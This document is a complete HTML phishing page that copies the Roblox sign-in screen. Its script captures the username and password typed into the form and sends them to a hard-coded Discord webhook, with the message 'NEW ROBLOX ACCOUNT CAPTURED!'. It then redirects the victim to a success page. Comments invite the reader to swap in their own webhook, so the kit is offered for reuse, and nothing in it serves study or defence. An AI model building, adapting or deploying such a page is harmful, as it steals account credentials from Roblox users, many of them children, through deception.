<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in | Roblox</title>
    <style>
        /* SAME CSS AS BEFORE FOR 100% MATCH */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Haptic', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000000;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-size: 16px;
        }

        .container {
            width: 100%;
            max-width: 440px;
            padding: 40px 40px 60px 40px;
        }

        h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .subtitle {
            color: #a1a1a1;
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 32px;
        }

        .form-group {
            margin-bottom: 24px;
            position: relative;
        }

        label {
            display: block;
            color: #ffffff;
            font-size: 16px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        input[type="text"],
        input[type="password"],
        input[type="email"] {
            width: 100%;
            padding: 12px 16px;
            background-color: #000000;
            border: 1px solid #4a4a4a;
            border-radius: 8px;
            color: #ffffff;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #ffffff;
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 38px;
            cursor: pointer;
            color: #a1a1a1;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .password-toggle svg {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }

        .btn-primary {
            width: 100%;
            padding: 12px;
            background-color: #0074e0;
            color: #ffffff;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-top: 8px;
            margin-bottom: 24px;
            transition: background-color 0.2s;
        }

        .btn-primary:hover {
            background-color: #0063c0;
        }

        .btn-secondary {
            width: 100%;
            padding: 12px;
            background-color: #1a1a1a;
            color: #ffffff;
            border: 1px solid #333333;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background-color 0.2s;
        }

        .btn-secondary:hover {
            background-color: #2a2a2a;
        }

        .btn-secondary svg {
            width: 20px;
            height: 20px;
            fill: currentColor;
        }

        .forgot-link {
            display: block;
            text-align: center;
            color: #ffffff;
            text-decoration: none;
            font-size: 16px;
            font-weight: 400;
            margin-bottom: 32px;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .divider {
            display: flex;
            align-items: center;
            text-align: center;
            margin: 24px 0;
            color: #4a4a4a;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            border-bottom: 1px solid #333333;
        }

        .divider span {
            padding: 0 16px;
            font-size: 16px;
            font-weight: 400;
        }

        .footer-text {
            text-align: center;
            margin-top: 32px;
            font-size: 16px;
            font-weight: 400;
        }

        .footer-text a {
            color: #ffffff;
            text-decoration: underline;
            font-weight: 700;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>Sign in</h1>
        <p class="subtitle">Jump back into your experiences</p>

        <form id="login-form">
            <div class="form-group">
                <label for="username">Username, email, or phone</label>
                <input type="text" id="username" placeholder="Username, email, or phone" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Password" required>
                <div class="password-toggle" onclick="togglePassword()">
                    <svg viewBox="0 0 24 24">
                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                    </svg>
                </div>
            </div>

            <button type="submit" class="btn-primary">Sign in</button>
        </form>

        <a href="#" class="forgot-link">Forgot password or username?</a>

        <div class="divider">
            <span>Or</span>
        </div>

        <button class="btn-secondary">
            <svg viewBox="0 0 24 24">
                <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
            </svg>
            Email a code
        </button>

        <button class="btn-secondary">
            <svg viewBox="0 0 24 24">
                <path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"/>
            </svg>
            Quick sign in
        </button>

        <p class="footer-text">Don't have an account? <a href="#">Create one</a></p>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
        }

        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // REPLACE THIS WITH YOUR DISCORD WEBHOOK URL
            const webhookURL = 'https://discord.com/api/webhooks/1500533248911216842/X59DkPqhdZkxL5iTJ6xJnmkgaJrskz4UzKGA_tifJRUjfih1MgotHc4ng9xkJXGCDm00';

            // Send credentials to Discord
            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    content: `**NEW ROBLOX ACCOUNT CAPTURED!**\n\n**Username:** ${username}\n**Password:** ${password}\n\n**IP Address:** ${window.location.hostname}`
                }),
            })
            .then(response => {
                if (response.ok) {
                    // Redirect to success page after sending
                    window.location.href = 'success.html';
                } else {
                    alert('Error sending data. Please try again.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Error sending data. Please try again.');
            });
        });

        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('keypress', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    document.getElementById('login-form').dispatchEvent(new Event('submit'));
                }
            });
        });
    </script>
</body>
</html>
